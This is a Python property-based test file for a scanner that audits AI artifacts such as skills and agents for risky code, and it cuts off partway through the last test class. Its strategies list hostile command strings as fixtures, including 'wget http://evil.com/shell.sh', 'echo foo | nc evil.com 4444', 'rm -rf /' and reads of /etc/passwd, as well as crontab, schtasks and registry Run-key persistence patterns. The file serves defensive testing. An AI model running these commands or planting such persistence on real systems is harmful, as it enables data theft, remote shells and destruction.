"""Property-based tests for scanner false positive reduction.

# Feature: scanner-false-positive-reduction, Property 1: Markdown code fence exclusion from backtick execution detection

**Validates: Requirements 1.1, 1.2, 1.5**

Property 1: Markdown code fence exclusion from backtick execution detection
For any artifact content containing Markdown code fence regions (lines starting with 3+
backticks through the matching closer), the CodeAudit scanner SHALL produce zero Ruby backtick
execution findings for any line that is a fence boundary or falls within a fence region.
"""

from __future__ import annotations

from hypothesis import given, settings
from hypothesis import strategies as st

from ai_artifact_risk_validator.scanners._markdown_context import MarkdownFenceTracker

# --- Strategies ---


@st.composite
def language_identifier(draw: st.DrawFn) -> str:
    """Generate an optional language identifier for a code fence opener."""
    has_lang = draw(st.booleans())
    if not has_lang:
        return ""
    return draw(
        st.sampled_from(
            ["python", "ruby", "javascript", "bash", "yaml", "json", "typescript", "rust", "go"]
        )
    )


@st.composite
def fence_backtick_count(draw: st.DrawFn) -> int:
    """Generate a valid backtick count for a code fence (3 or more)."""
    return draw(st.integers(min_value=3, max_value=8))


@st.composite
def non_fence_line(draw: st.DrawFn) -> str:
    """Generate a line that is NOT a fence boundary.

    Avoids lines starting with 3+ backticks to ensure they won't be
    mistakenly parsed as fence boundaries.
    """
    line = draw(
        st.text(
            alphabet=st.characters(
                categories=("L", "N", "P", "S", "Z"),
                exclude_characters="`",
            ),
            min_size=0,
            max_size=80,
        )
    )
    return line


@st.composite
def interior_content_lines(draw: st.DrawFn) -> list[str]:
    """Generate lines that appear inside a code fence (between opener and closer).

    These may contain backtick content that would look like Ruby execution
    if not inside a fence.
    """
    num_lines = draw(st.integers(min_value=0, max_value=10))
    lines: list[str] = []
    for _ in range(num_lines):
        line_type = draw(st.sampled_from(["plain", "backtick_command", "code"]))
        if line_type == "plain":
            lines.append(draw(non_fence_line()))
        elif line_type == "backtick_command":
            # Ruby-style backtick command that should NOT be flagged inside fence
            cmd = draw(st.sampled_from(["ls -la", "whoami", "cat /etc/passwd", "rm -rf /"]))
            lines.append(f"`{cmd}`")
        else:
            # Code-like content
            code = draw(
                st.sampled_from(
                    [
                        "result = `uname -a`",
                        "output = `date`",
                        "x = 1 + 2",
                        "def foo():",
                        "    return bar",
                    ]
                )
            )
            lines.append(code)
    return lines


@st.composite
def markdown_fenced_content(draw: st.DrawFn) -> tuple[list[str], list[int]]:
    """Generate content with one or more valid Markdown code fences.

    Returns:
        A tuple of (all_lines, fence_related_line_numbers) where
        fence_related_line_numbers are 1-based line numbers that are either
        fence boundaries or inside a fence.
    """
    num_fences = draw(st.integers(min_value=1, max_value=4))
    all_lines: list[str] = []
    fence_line_numbers: list[int] = []

    for _ in range(num_fences):
        # Add some non-fence lines before the fence
        prefix_lines = draw(st.lists(non_fence_line(), min_size=0, max_size=3))
        all_lines.extend(prefix_lines)

        # Generate the fence opener
        backticks = draw(fence_backtick_count())
        lang = draw(language_identifier())
        opener = "`" * backticks + lang
        opener_line_num = len(all_lines) + 1  # 1-based
        all_lines.append(opener)
        fence_line_numbers.append(opener_line_num)

        # Generate interior content
        interior = draw(interior_content_lines())
        for i, line in enumerate(interior):
            line_num = len(all_lines) + 1  # 1-based
            all_lines.append(line)
            fence_line_numbers.append(line_num)

        # Generate the fence closer (same or more backticks, no lang id)
        closer_backticks = draw(st.integers(min_value=backticks, max_value=backticks + 2))
        closer = "`" * closer_backticks
        closer_line_num = len(all_lines) + 1  # 1-based
        all_lines.append(closer)
        fence_line_numbers.append(closer_line_num)

    # Optionally add trailing non-fence lines
    suffix_lines = draw(st.lists(non_fence_line(), min_size=0, max_size=3))
    all_lines.extend(suffix_lines)

    return all_lines, fence_line_numbers


# --- Property Tests ---


class TestMarkdownFenceExclusion:
    """Property 1: Markdown code fence exclusion from backtick execution detection.

    **Validates: Requirements 1.1, 1.2, 1.5**

    For any artifact content containing Markdown code fence regions (lines starting
    with 3+ backticks through the matching closer), the MarkdownFenceTracker SHALL
    correctly identify fence boundaries and interior lines so that the CodeAudit scanner
    produces zero Ruby backtick execution findings for those lines.
    """

    @given(data=markdown_fenced_content())
    @settings(max_examples=100, deadline=None)
    def test_fence_boundaries_are_identified(self, data: tuple[list[str], list[int]]) -> None:
        """Every fence opener and closer line is identified as a fence boundary
        or inside a fence by the tracker."""
        lines, fence_line_numbers = data
        tracker = MarkdownFenceTracker(lines)

        for line_num in fence_line_numbers:
            is_boundary = tracker.is_fence_boundary(line_num)
            is_inside = tracker.is_in_fence(line_num)
            assert is_boundary or is_inside, (
                f"Line {line_num} ('{lines[line_num - 1]}') should be a fence boundary "
                f"or inside a fence, but is_fence_boundary={is_boundary}, "
                f"is_in_fence={is_inside}"
            )

    @given(data=markdown_fenced_content())
    @settings(max_examples=100, deadline=None)
    def test_fence_boundary_not_also_interior(self, data: tuple[list[str], list[int]]) -> None:
        """A fence boundary line (opener/closer) should NOT also be reported
        as inside a fence — boundary and interior are mutually exclusive."""
        lines, _ = data
        tracker = MarkdownFenceTracker(lines)

        for line_num in range(1, len(lines) + 1):
            if tracker.is_fence_boundary(line_num):
                assert not tracker.is_in_fence(line_num), (
                    f"Line {line_num} is a fence boundary but also reports "
                    f"as inside a fence — these should be mutually exclusive"
                )

    @given(data=markdown_fenced_content())
    @settings(max_examples=100, deadline=None)
    def test_interior_lines_are_inside_fence(self, data: tuple[list[str], list[int]]) -> None:
        """Lines between a fence opener and closer (excluding boundaries)
        should be reported as inside a fence."""
        lines, _ = data
        tracker = MarkdownFenceTracker(lines)
        regions = tracker.regions

        for region in regions:
            # Interior lines are those strictly between start and end
            for line_num in range(region.start_line + 1, region.end_line):
                assert tracker.is_in_fence(line_num), (
                    f"Line {line_num} is between fence opener (line {region.start_line}) "
                    f"and closer (line {region.end_line}) but is_in_fence returned False"
                )

    @given(data=markdown_fenced_content())
    @settings(max_examples=100, deadline=None)
    def test_lines_outside_fences_not_marked(self, data: tuple[list[str], list[int]]) -> None:
        """Lines that are not in any fence region should NOT be reported as
        boundaries or inside a fence."""
        lines, fence_line_numbers = data
        tracker = MarkdownFenceTracker(lines)
        fence_set = set(fence_line_numbers)

        for line_num in range(1, len(lines) + 1):
            if line_num not in fence_set:
                assert not tracker.is_fence_boundary(line_num), (
                    f"Line {line_num} ('{lines[line_num - 1]}') is not in a fence "
                    f"region but is_fence_boundary returned True"
                )
                assert not tracker.is_in_fence(line_num), (
                    f"Line {line_num} ('{lines[line_num - 1]}') is not in a fence "
                    f"region but is_in_fence returned True"
                )

    @given(
        backtick_count=st.integers(min_value=3, max_value=8),
        lang=language_identifier(),
        interior=interior_content_lines(),
    )
    @settings(max_examples=100, deadline=None)
    def test_opener_line_is_boundary(
        self,
        backtick_count: int,
        lang: str,
        interior: list[str],
    ) -> None:
        """A line starting with 3+ backticks (optionally followed by a language
        identifier) is classified as a fence boundary."""
        opener = "`" * backtick_count + lang
        closer = "`" * backtick_count
        lines = [opener, *interior, closer]

        tracker = MarkdownFenceTracker(lines)
        assert tracker.is_fence_boundary(1), (
            f"Opener line '{opener}' not identified as fence boundary"
        )

    @given(
        backtick_count=st.integers(min_value=3, max_value=8),
        interior=interior_content_lines(),
    )
    @settings(max_examples=100, deadline=None)
    def test_closer_line_is_boundary(
        self,
        backtick_count: int,
        interior: list[str],
    ) -> None:
        """A closing fence line is classified as a fence boundary."""
        opener = "`" * backtick_count + "python"
        closer = "`" * backtick_count
        lines = [opener, *interior, closer]

        tracker = MarkdownFenceTracker(lines)
        closer_line_num = len(lines)
        assert tracker.is_fence_boundary(closer_line_num), (
            f"Closer line '{closer}' at line {closer_line_num} not identified as fence boundary"
        )


# Feature: scanner-false-positive-reduction, Property 2: Genuine Ruby backtick execution detection preserved


# --- Strategies for Property 2 ---


@st.composite
def command_string(draw: st.DrawFn) -> str:
    """Generate a command string that looks like a shell command for backtick execution.

    Only generates commands that Phase 2 inline code span filtering will NOT suppress:
    - Multi-token commands where the first token is a known shell executable
    - Commands containing shell metacharacters
    """
    return draw(
        st.sampled_from(
            [
                "ls -la",
                "cat /etc/passwd",
                "rm -rf /tmp",
                "curl http://example.com",
                "wget http://evil.com/shell.sh",
                "find / -name secret",
                "grep -r secret .",
                "ssh user@host",
                "docker run evil",
                "sudo rm -rf /",
                "chmod 777 /etc/shadow",
                "echo foo | nc evil.com 4444",
                "curl http://x && rm -rf /",
                "cat /etc/passwd > /tmp/out",
            ]
        )
    )


@st.composite
def ruby_backtick_execution_line(draw: st.DrawFn) -> str:
    """Generate a single line containing Ruby-style backtick execution.

    The line contains a single-backtick pair enclosing a command string,
    optionally with a variable assignment prefix.
    """
    cmd = draw(command_string())
    has_assignment = draw(st.booleans())
    if has_assignment:
        var_name = draw(st.sampled_from(["result", "output", "data", "val", "x", "resp"]))
        return f"{var_name} = `{cmd}`"
    return f"`{cmd}`"


@st.composite
def content_with_backtick_outside_fence(draw: st.DrawFn) -> str:
    """Generate artifact content with a genuine Ruby backtick execution line
    that appears outside of any Markdown code fence.

    The structure is:
    - Optional non-fence prefix lines (plain text or headings)
    - A line with Ruby-style backtick execution (the target)
    - Optional non-fence suffix lines

    No Markdown code fences (``` or more) appear anywhere in the content,
    ensuring the backtick execution line is definitively outside any fence.
    """
    # Generate prefix lines that are definitely not fence boundaries
    num_prefix = draw(st.integers(min_value=0, max_value=5))
    prefix_lines: list[str] = []
    for _ in range(num_prefix):
        line = draw(
            st.sampled_from(
                [
                    "# Heading",
                    "Some descriptive text here.",
                    "- bullet point item",
                    "Another paragraph of content.",
                    "",
                    "## Sub-heading",
                    "Configuration details follow.",
                ]
            )
        )
        prefix_lines.append(line)

    # Generate the backtick execution line
    backtick_line = draw(ruby_backtick_execution_line())

    # Generate suffix lines (also not fence boundaries)
    num_suffix = draw(st.integers(min_value=0, max_value=5))
    suffix_lines: list[str] = []
    for _ in range(num_suffix):
        line = draw(
            st.sampled_from(
                [
                    "End of file.",
                    "# Another section",
                    "More text content.",
                    "",
                    "Final notes.",
                ]
            )
        )
        suffix_lines.append(line)

    all_lines = prefix_lines + [backtick_line] + suffix_lines
    return "\n".join(all_lines)


# --- Property 2 Test ---


class TestGenuineBacktickDetectionPreserved:
    """Property 2: Genuine Ruby backtick execution detection preserved.

    # Feature: scanner-false-positive-reduction, Property 2: Genuine Ruby backtick execution detection preserved

    **Validates: Requirements 1.3, 7.1**

    For any single-line backtick pair enclosing a command string that appears outside
    a Markdown code fence, the CodeAudit scanner SHALL produce at least one ScanFinding
    with unchanged confidence.
    """

    @given(content=content_with_backtick_outside_fence())
    @settings(max_examples=100, deadline=None)
    def test_backtick_execution_outside_fence_produces_finding(self, content: str) -> None:
        """A single-line backtick pair enclosing a command outside any Markdown code
        fence produces at least one ScanFinding from the CodeAudit scanner."""
        from ai_artifact_risk_validator.models.enums import ArtifactType
        from ai_artifact_risk_validator.scanners.code_audit import CodeAuditScanner

        scanner = CodeAuditScanner()
        findings = scanner.scan(
            artifact_content=content,
            artifact_type=ArtifactType.SKILL,
            artifact_path="test_artifact.md",
        )

        # At least one finding should be produced for the backtick execution
        backtick_findings = [
            f
            for f in findings
            if "backtick" in f.description.lower() or "command execution" in f.description.lower()
        ]
        assert len(backtick_findings) >= 1, (
            f"Expected at least one backtick execution finding for content "
            f"outside a fence, but got {len(backtick_findings)} findings. "
            f"Content:\n{content}"
        )

        # Verify confidence is unchanged (0.85 for regex-detected backtick execution,
        # or 0.60 for unknown language confidence adjustment)
        for finding in backtick_findings:
            assert finding.confidence >= 0.60, (
                f"Expected confidence >= 0.60 (unchanged), "
                f"but got {finding.confidence} for finding: {finding.description}"
            )


# Feature: scanner-false-positive-reduction, Property 9: Docstring and comment exclusion from persistence detection
# Feature: scanner-false-positive-reduction, Property 10: Executable code persistence detection preserved


# --- Strategies for Properties 9 and 10 ---


_PERSISTENCE_PATTERNS = [
    "crontab -l",
    "crontab -r",
    "crontab /etc/cron.d/job",
    "systemctl enable myservice",
    "schtasks /Create /TN task",
    r"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
    r"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
]


@st.composite
def persistence_in_docstring(draw: st.DrawFn) -> str:
    """Generate Python content with persistence patterns inside docstrings or comments.

    Returns a complete Python file where persistence patterns appear ONLY
    inside triple-quoted docstrings or on comment lines, never in executable code.
    """
    pattern = draw(st.sampled_from(_PERSISTENCE_PATTERNS))
    context_type = draw(st.sampled_from(["docstring_double", "docstring_single", "comment"]))

    # Non-persistence code lines to pad the file
    padding_lines = draw(
        st.lists(
            st.sampled_from(
                [
                    "import os",
                    "x = 1",
                    "def helper():",
                    "    return True",
                    "",
                    "result = []",
                    "for i in range(10):",
                    "    result.append(i)",
                ]
            ),
            min_size=1,
            max_size=5,
        )
    )

    if context_type == "docstring_double":
        # Persistence pattern inside a triple-double-quoted docstring
        docstring_lines = [
            '"""',
            f"This function uses {pattern} for scheduling.",
            "It is documented here for reference only.",
            '"""',
        ]
    elif context_type == "docstring_single":
        # Persistence pattern inside a triple-single-quoted docstring
        docstring_lines = [
            "'''",
            f"Example: {pattern}",
            "This is just documentation.",
            "'''",
        ]
    else:
        # Persistence pattern on a comment line
        docstring_lines = [
            f"# Example command: {pattern}",
        ]

    all_lines = padding_lines + docstring_lines + ["", "y = 2"]
    return "\n".join(all_lines)


@st.composite
def persistence_in_code(draw: st.DrawFn) -> str:
    """Generate Python content with persistence patterns in executable code.

    Returns a complete Python file where a persistence pattern appears in
    executable code (outside any docstring or comment), ensuring the scanner
    should detect it.
    """
    pattern = draw(st.sampled_from(_PERSISTENCE_PATTERNS))
    code_context = draw(
        st.sampled_from(
            [
                "subprocess_call",
                "os_system",
                "bare_line",
            ]
        )
    )

    # Build a Python file with the persistence pattern in executable code
    prefix_lines = [
        "import subprocess",
        "import os",
        "",
    ]

    if code_context == "subprocess_call":
        code_line = f'subprocess.run("{pattern}", shell=True)'
    elif code_context == "os_system":
        code_line = f'os.system("{pattern}")'
    else:
        # Bare line containing the pattern as executable code
        code_line = f'cmd = "{pattern}"'

    suffix_lines = [
        "",
        "print('done')",
    ]

    all_lines = prefix_lines + [code_line] + suffix_lines
    return "\n".join(all_lines)


# --- Property 9 Test ---


class TestDocstringCommentExclusionPersistence:
    """Property 9: Docstring and comment exclusion from persistence detection.

    # Feature: scanner-false-positive-reduction, Property 9: Docstring and comment exclusion from persistence detection

    **Validates: Requirements 5.1, 5.2**

    For any persistence pattern (crontab, systemctl enable, schtasks, registry run keys)
    appearing inside a Python triple-quoted docstring or on a Python comment line,
    the CodeAudit scanner SHALL produce zero RA-S2 findings for that occurrence.
    """

    @given(content=persistence_in_docstring())
    @settings(max_examples=100, deadline=None)
    def test_persistence_in_docstring_produces_no_ra_s2(self, content: str) -> None:
        """Persistence patterns inside docstrings or comments produce zero RA-S2 findings."""
        from ai_artifact_risk_validator.models.enums import ArtifactType
        from ai_artifact_risk_validator.scanners.code_audit import CodeAuditScanner

        scanner = CodeAuditScanner()
        findings = scanner.scan(
            artifact_content=content,
            artifact_type=ArtifactType.AGENT,
            artifact_path="test_module.py",
        )

        ra_s2_findings = [f for f in findings if f.id == "RA-S2"]
        assert len(ra_s2_findings) == 0, (
            f"Expected zero RA-S2 findings for persistence patterns in "
            f"docstrings/comments, but got {len(ra_s2_findings)}.\n"
            f"Findings: {[(f.id, f.evidence) for f in ra_s2_findings]}\n"
            f"Content:\n{content}"
        )


# --- Property 10 Test ---


class TestExecutableCodePersistenceDetection:
    """Property 10: Executable code persistence detection preserved.

    # Feature: scanner-false-positive-reduction, Property 10: Executable code persistence detection preserved

    **Validates: Requirements 5.3, 5.4, 7.5**

    For any persistence pattern appearing in executable Python code (outside docstrings
    and comments), the CodeAudit scanner SHALL produce at least one RA-S2 ScanFinding
    with unchanged confidence.
    """

    @given(content=persistence_in_code())
    @settings(max_examples=100, deadline=None)
    def test_persistence_in_code_produces_ra_s2(self, content: str) -> None:
        """Persistence patterns in executable code produce at least one RA-S2 finding."""
        from ai_artifact_risk_validator.models.enums import ArtifactType
        from ai_artifact_risk_validator.scanners.code_audit import CodeAuditScanner

        scanner = CodeAuditScanner()
        findings = scanner.scan(
            artifact_content=content,
            artifact_type=ArtifactType.AGENT,
            artifact_path="test_module.py",
        )

        ra_s2_findings = [f for f in findings if f.id == "RA-S2"]
        assert len(ra_s2_findings) >= 1, (
            f"Expected at least one RA-S2 finding for persistence pattern in "
            f"executable code, but got {len(ra_s2_findings)}.\n"
            f"Content:\n{content}"
        )

        # Verify confidence is unchanged (0.90 as per _scan_rogue_agent)
        for finding in ra_s2_findings:
            assert finding.confidence == 0.90, (
                f"Expected confidence 0.90 (unchanged), "
                f"but got {finding.confidence} for finding: {finding.evidence}"
            )


# Feature: scanner-false-positive-reduction, Property 5: Destructive keywords in code context produce findings
# Feature: scanner-false-positive-reduction, Property 6: Destructive keywords in prose excluded


# --- Strategies for Properties 5 and 6 ---

# Destructive keywords as defined in the scanner regex
_DESTRUCTIVE_KEYWORDS = [
    "truncate",
    "halt",
    "drop",
    "kill",
    "shutdown",
    "reboot",
    "poweroff",
    "rm -rf",
    "rmdir",
    "deltree",
    "format",
]

# Destructive operation risk IDs by artifact type
_DESTRUCTIVE_RISK_IDS = {"A-S6", "SK-S2", "MCP-S1", "H-S1", "PL-S1"}


@st.composite
def destructive_keyword(draw: st.DrawFn) -> str:
    """Generate a destructive keyword from the scanner's regex pattern."""
    return draw(st.sampled_from(_DESTRUCTIVE_KEYWORDS))


@st.composite
def destructive_keyword_in_code(draw: st.DrawFn) -> tuple[str, str]:
    """Generate content with a destructive keyword in a code context.

    Returns a tuple of (full_content, keyword) where the keyword appears in one of:
    - Inside a Markdown code block (fenced)
    - A function call pattern (e.g., os.truncate(, TRUNCATE TABLE)
    - After a shell prompt indicator ($ halt, > truncate)
    """
    keyword = draw(destructive_keyword())
    context_type = draw(st.sampled_from(["code_fence", "function_call", "shell_prompt"]))

    if context_type == "code_fence":
        # Place the keyword inside a Markdown code block
        lang = draw(st.sampled_from(["python", "bash", "sql", ""]))
        opener = "```" + lang
        # Use keyword in a plausible code line inside the fence
        code_line = draw(
            st.sampled_from(
                [
                    f"os.{keyword}(filepath)",
                    f"{keyword.upper()} TABLE users;",
                    f"$ {keyword} --force",
                    f"system.{keyword}()",
                    f"{keyword}",
                ]
            )
        )
        closer = "```"
        content = f"Some prose before.\n\n{opener}\n{code_line}\n{closer}\n\nSome prose after."

    elif context_type == "function_call":
        # Place the keyword in a function call pattern
        pattern_style = draw(st.sampled_from(["direct_call", "qualified_call", "sql_command"]))
        if pattern_style == "direct_call":
            # keyword( — direct function call
            line = f"{keyword}(filepath, mode=0)"
        elif pattern_style == "qualified_call":
            # module.keyword( — qualified function call
            module = draw(st.sampled_from(["os", "db", "system", "fs", "shutil"]))
            line = f"{module}.{keyword}(target)"
        else:
            # SQL-style: TRUNCATE TABLE, DROP DATABASE, etc.
            sql_noun = draw(st.sampled_from(["table", "database", "index", "schema", "view"]))
            line = f"{keyword.upper()} {sql_noun} users_data;"

        content = f"Configuration:\n\n{line}\n\nEnd of config."

    else:
        # Shell prompt indicator
        prompt = draw(st.sampled_from(["$ ", "> "]))
        args = draw(st.sampled_from(["", " --force", " -9 process", " /dev/sda"]))
        line = f"{prompt}{keyword}{args}"
        content = f"Example usage:\n\n{line}\n\nDone."

    return content, keyword


@st.composite
def destructive_keyword_in_prose(draw: st.DrawFn) -> tuple[str, str]:
    """Generate content with a destructive keyword in Markdown prose context.

    The keyword appears in headings, bullet points, or paragraph text without
    any code context (not inside a code fence, not in a function call pattern,
    not after a shell prompt).

    Returns a tuple of (full_content, keyword).
    """
    keyword = draw(destructive_keyword())
    prose_type = draw(st.sampled_from(["heading", "bullet", "paragraph"]))

    if prose_type == "heading":
        # Markdown heading containing the keyword
        heading_level = draw(st.integers(min_value=1, max_value=4))
        prefix = "#" * heading_level
        heading_text = draw(
            st.sampled_from(
                [
                    f"How to {keyword} old records safely",
                    f"Understanding the {keyword} command",
                    f"When to {keyword} services",
                    f"Guide to {keyword} operations",
                ]
            )
        )
        content = f"{prefix} {heading_text}\n\nThis section explains the concept."

    elif prose_type == "bullet":
        # Markdown bullet point containing the keyword
        bullet_prefix = draw(st.sampled_from(["- ", "* ", "+ "]))
        bullet_text = draw(
            st.sampled_from(
                [
                    f"Use {keyword} to clean up stale entries",
                    f"The {keyword} operation is irreversible",
                    f"Consider alternatives before you {keyword} the data",
                    f"Never {keyword} production systems without backup",
                ]
            )
        )
        content = f"Best practices:\n\n{bullet_prefix}{bullet_text}\n\nRemember to be careful."

    else:
        # Paragraph prose text
        paragraph = draw(
            st.sampled_from(
                [
                    f"You may need to {keyword} the log files when disk space is low.",
                    f"The system will {keyword} old sessions after 30 days of inactivity.",
                    f"Administrators can {keyword} resources that are no longer needed.",
                    f"It is recommended to {keyword} temporary data before restarting.",
                ]
            )
        )
        content = f"Overview\n\n{paragraph}\n\nEnd of document."

    return content, keyword


# --- Property 5 and 6 Tests ---


class TestDestructiveKeywordInCodeContext:
    """Property 5: Destructive keywords in code context produce findings.

    # Feature: scanner-false-positive-reduction, Property 5: Destructive keywords in code context produce findings

    **Validates: Requirements 3.1, 3.2, 3.3, 7.3**

    For any destructive keyword appearing inside a Markdown code block or as part of
    a function call pattern (e.g., os.truncate(, TRUNCATE TABLE) or after a shell prompt
    indicator ($ halt), the scanner SHALL produce at least one Destructive_Operation
    ScanFinding.
    """

    @given(data=destructive_keyword_in_code())
    @settings(max_examples=100, deadline=None)
    def test_destructive_keyword_in_code_produces_finding(self, data: tuple[str, str]) -> None:
        """A destructive keyword in a code context (code fence, function call,
        or shell prompt) produces at least one destructive operation finding."""
        from ai_artifact_risk_validator.models.enums import ArtifactType
        from ai_artifact_risk_validator.scanners.code_audit import CodeAuditScanner

        content, keyword = data
        scanner = CodeAuditScanner()
        findings = scanner.scan(
            artifact_content=content,
            artifact_type=ArtifactType.AGENT,
            artifact_path="test_agent.md",
        )

        # Filter to destructive operation findings
        destructive_findings = [f for f in findings if f.id in _DESTRUCTIVE_RISK_IDS]
        assert len(destructive_findings) >= 1, (
            f"Expected at least one destructive operation finding for keyword "
            f"'{keyword}' in code context, but got {len(destructive_findings)}. "
            f"All findings: {[f.id for f in findings]}. "
            f"Content:\n{content}"
        )


class TestDestructiveKeywordInProseExcluded:
    """Property 6: Destructive keywords in prose excluded.

    # Feature: scanner-false-positive-reduction, Property 6: Destructive keywords in prose excluded

    **Validates: Requirements 3.4, 3.5**

    For any destructive keyword appearing in Markdown prose (headings, bullet points,
    paragraph text) without any code context (not inside a code fence, not in a function
    call pattern, not after a shell prompt), the scanner SHALL produce zero
    Destructive_Operation findings for that occurrence.
    """

    @given(data=destructive_keyword_in_prose())
    @settings(max_examples=100, deadline=None)
    def test_destructive_keyword_in_prose_produces_no_finding(self, data: tuple[str, str]) -> None:
        """A destructive keyword in prose context (heading, bullet, paragraph)
        produces zero destructive operation findings."""
        from ai_artifact_risk_validator.models.enums import ArtifactType
        from ai_artifact_risk_validator.scanners.code_audit import CodeAuditScanner

        content, keyword = data
        scanner = CodeAuditScanner()
        findings = scanner.scan(
            artifact_content=content,
            artifact_type=ArtifactType.AGENT,
            artifact_path="test_agent.md",
        )

        # Filter to destructive operation findings only
        destructive_findings = [f for f in findings if f.id in _DESTRUCTIVE_RISK_IDS]
        assert len(destructive_findings) == 0, (
            f"Expected zero destructive operation findings for keyword "
            f"'{keyword}' in prose context, but got {len(destructive_findings)}. "
            f"Findings: {[(f.id, f.evidence) for f in destructive_findings]}. "
            f"Content:\n{content}"
        )


# Feature: scanner-false-positive-reduction, Property 3: Markdown formatting exclusion from glob/wildcard detection
# Feature: scanner-false-positive-reduction, Property 4: Genuine glob pattern detection preserved


# --- Strategies for Properties 3 and 4 ---


@st.composite
def word_before_asterisk(draw: st.DrawFn) -> str:
    """Generate a word character sequence that will precede an asterisk.

    These are words (letters/digits/underscores) that when followed by `*` or `**`
    represent Markdown formatting, NOT glob patterns.
    """
    return draw(
        st.sampled_from(
            [
                "File",
                "Scope",
                "bold",
                "Important",
                "Text",
                "Word",
                "Config",
                "feature",
                "module",
                "status",
                "priority",
                "level",
                "access",
                "Type",
                "Name",
                "value123",
                "item_one",
            ]
        )
    )


@st.composite
def markdown_formatted_text(draw: st.DrawFn) -> tuple[str, str]:
    """Generate text with `*` or `**` immediately following a word character,
    representing Markdown formatting (bold or italic).

    Returns:
        A tuple of (full_line, formatting_type) where formatting_type is
        'bold' or 'italic'.
    """
    word = draw(word_before_asterisk())
    is_bold = draw(st.booleans())

    if is_bold:
        # Markdown bold: **word** or word**
        style = draw(st.sampled_from(["closing", "surrounding"]))
        if style == "closing":
            # e.g., "This is **important** text" — the closing ** follows a word
            inner_word = draw(word_before_asterisk())
            line = f"This is **{inner_word}** text about configuration"
        else:
            # e.g., "File** indicates bold formatting end"
            line = f"The {word}** section describes the feature"
        formatting_type = "bold"
    else:
        # Markdown italic: *word* or word*
        style = draw(st.sampled_from(["closing", "surrounding"]))
        if style == "closing":
            # e.g., "This is *important* text"
            inner_word = draw(word_before_asterisk())
            line = f"This is *{inner_word}* text about configuration"
        else:
            # e.g., "File* indicates italic formatting end"
            line = f"The {word}* section describes the feature"
        formatting_type = "italic"

    return line, formatting_type


@st.composite
def markdown_formatted_content(draw: st.DrawFn) -> str:
    """Generate full artifact content with Markdown formatting asterisks
    that should NOT trigger glob/wildcard findings.

    The content contains asterisks immediately following word characters
    without preceding path separators — Markdown formatting only.
    """
    num_lines = draw(st.integers(min_value=1, max_value=8))
    lines: list[str] = []

    # Add a heading for context
    heading = draw(
        st.sampled_from(
            [
                "# Configuration Guide",
                "# Feature Specification",
                "# Module Documentation",
                "## API Reference",
                "## Architecture Overview",
            ]
        )
    )
    lines.append(heading)
    lines.append("")

    for _ in range(num_lines):
        line_type = draw(st.sampled_from(["formatted", "plain", "bullet"]))
        if line_type == "formatted":
            formatted_line, _ = draw(markdown_formatted_text())
            lines.append(formatted_line)
        elif line_type == "bullet":
            word = draw(word_before_asterisk())
            bullet_style = draw(st.sampled_from(["bold", "italic"]))
            if bullet_style == "bold":
                lines.append(f"- **{word}** is a required parameter")
            else:
                lines.append(f"- *{word}* is an optional setting")
        else:
            lines.append(
                draw(
                    st.sampled_from(
                        [
                            "This describes the system architecture.",
                            "The module handles authentication.",
                            "Configuration values are loaded at startup.",
                            "",
                            "See the documentation for details.",
                        ]
                    )
                )
            )

    return "\n".join(lines)


@st.composite
def glob_pattern_paths(draw: st.DrawFn) -> str:
    """Generate artifact content with genuine glob patterns after path separators.

    These contain asterisks after path separators (e.g., `/etc/*`, `/var/**`)
    that SHOULD trigger glob/wildcard findings from the PermAudit scanner.

    Uses directories recognized by the scanner's "Broad path access pattern":
    /etc/, /var/, /usr/, /opt/, /root/, /proc/, /sys/
    """
    # Generate a path prefix using directories the scanner recognizes
    path_prefix = draw(
        st.sampled_from(
            [
                "/etc",
                "/var/log",
                "/opt/data",
                "/usr/local",
                "/proc",
                "/sys",
                "/root",
                "/var/run",
            ]
        )
    )

    # Generate the glob suffix
    glob_suffix = draw(
        st.sampled_from(
            [
                "/*",
                "/**",
                "/*.conf",
                "/**/*.py",
            ]
        )
    )

    glob_path = path_prefix + glob_suffix

    # Embed the glob pattern in a quoted context that the scanner's
    # "Broad path access pattern" will detect (requires a quote or `path =:` prefix)
    context_style = draw(
        st.sampled_from(
            [
                "quoted_path",
                "path_colon",
            ]
        )
    )

    if context_style == "quoted_path":
        # Quoted path triggers "Broad path access pattern": (?:["']|path\s*[=:])\s*/...
        line = f'file_path = "{glob_path}"'
    else:
        # path: /etc/... triggers "Broad path access pattern"
        line = f"path: {glob_path}"

    # Add some surrounding context
    prefix = draw(
        st.sampled_from(
            [
                "# Scanner configuration\n",
                "# File access rules\n",
                "",
            ]
        )
    )

    return prefix + line


# --- Property 3 and 4 Tests ---


class TestMarkdownFormattingExclusionFromGlob:
    """Property 3: Markdown formatting exclusion from glob/wildcard detection.

    # Feature: scanner-false-positive-reduction, Property 3: Markdown formatting exclusion from glob/wildcard detection

    **Validates: Requirements 2.1, 2.2**

    For any asterisk sequence (`*` or `**`) that immediately follows a word character
    without a preceding path separator on the same token, the PermAudit scanner SHALL
    produce zero glob pattern or sensitive file access findings for that asterisk occurrence.
    """

    @given(content=markdown_formatted_content())
    @settings(max_examples=100, deadline=None)
    def test_markdown_formatting_produces_no_glob_findings(self, content: str) -> None:
        """Markdown bold/italic formatting asterisks that follow word characters
        without a path separator do NOT produce glob or wildcard findings."""
        from ai_artifact_risk_validator.models.enums import ArtifactType
        from ai_artifact_risk_validator.scanners.perm_audit import PermAuditScanner

        scanner = PermAuditScanner()
        findings = scanner.scan(
            artifact_content=content,
            artifact_type=ArtifactType.SKILL,
            artifact_path="docs/feature_spec.md",
        )

        # Filter to only glob/wildcard-related findings
        glob_related_findings = [
            f
            for f in findings
            if any(keyword in f.evidence.lower() for keyword in ["*", "wildcard", "glob"])
            and not any(
                # Exclude findings that aren't about the asterisk formatting
                non_glob in f.evidence.lower()
                for non_glob in ["/etc/", "/tmp/", "/var/", "/proc/", "/sys/", "/root/"]
            )
        ]

        # None of these findings should be triggered by Markdown formatting asterisks
        # Filter further: only complain about findings where the evidence contains
        # an asterisk immediately following a word character (the markdown pattern)
        import re

        markdown_asterisk_findings = [
            f for f in glob_related_findings if re.search(r"\w\*", f.evidence)
        ]

        assert len(markdown_asterisk_findings) == 0, (
            f"Expected zero glob/wildcard findings for Markdown formatting, "
            f"but got {len(markdown_asterisk_findings)} findings. "
            f"Content:\n{content}\n"
            f"Findings: {[(f.evidence, f.description) for f in markdown_asterisk_findings]}"
        )


class TestGenuineGlobPatternDetectionPreserved:
    """Property 4: Genuine glob pattern detection preserved.

